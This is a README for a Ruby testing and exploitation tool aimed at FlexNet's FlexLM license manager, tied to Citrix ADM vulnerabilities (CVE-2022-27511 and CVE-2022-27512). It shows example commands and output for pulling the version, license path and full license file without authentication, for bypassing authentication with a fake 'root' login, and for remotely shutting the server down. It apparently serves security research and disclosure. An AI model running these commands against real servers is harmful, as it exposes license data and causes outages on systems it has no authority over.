Testing / exploitation tools for FlexNet's FlexLM license manager.

This license manager is used by a whole lotta software, but we developed this
for Citrix ADM vulnerabilities (CVE-2022-27511 and CVE-2022-27512).

# Usage

## Unauthenticated Stuff

The following commands require no authentication, and can be amazingly helpful!

To get a version number:

```
$ ruby ./flexnet-tools.rb 10.0.0.8 version
Server reported: v11.16.6.0
```

License path:

```
$ ruby ./flexnet-tools.rb 10.0.0.8 path
LW37/mpsconfig/license/citrix_startup.lic
```

List of available licensing services:

```
$ ruby ./flexnet-tools.rb 10.0.0.8 dlist
Lv7CITRIX
```

Full license file (yes, it serves this without auth):

```
$ ruby ./flexnet-tools.rb 10.0.0.8 license
L6195# DO NOT REMOVE THIS COMMENT LINE
# "のコメント行は削除しLL6061NEN
# NE SUPPRIMEZ PAS CETTE LIGNE DE COMMENTAIRE
# NO ELIMINAR ESTA LÍNL5927IX PORT=7279
USE_SERVER
#
#
INCREMENT CITRIX CITRIX 2038.0101 permanentLQ5793IGN="0DC4 A818 \
        CE0C ED78 1FED 3C6C CB56 8E22 7DF8 9F78 BE36 6928 96DD 2LG5659D51 1F9B \
        141C 9A01 FA1A EB22"
[...]
```

## Semi-Authenticated Stuff

These are endpoints that kinda sometimes require authentication, but only if
the application is started with `-2 -p`.. as of this writing, even if it is, it
can be bypassed anyways.

This command will reload the license file.. pass the `login` parameter to do a
fake login first, which will let you run restricted commands:

```
$ ruby ./flexnet-tools.rb 10.0.0.9 lmreread
41a10000000[...]

$ ruby ./flexnet-tools.rb 10.0.0.9 lmreread login
Authenticating with username 'root'
2f680ef30020011341414141
```

This doesn't do much, besides force the server to reload its config. But for
extra fun, you can also shut down the server:

```
$ ruby ./flexnet-tools.rb 10.0.0.9 lmdown
48102d31313900000000[...]

$ ruby ./flexnet-tools.rb 10.0.0.9 lmdown login
Authenticating with username 'root'

$ ruby ./flexnet-tools.rb 10.0.0.9 lmdown login
Traceback (most recent call last):
        2: from ./flexnet-tools.rb:21:in `<main>'
        1: from ./flexnet-tools.rb:21:in `new'
./flexnet-tools.rb:21:in `initialize': Connection refused - connect(2) for "10.0.0.9" port 27000 (Errno::ECONNREFUSED)
```

Probably best not to do that on a production host. :)
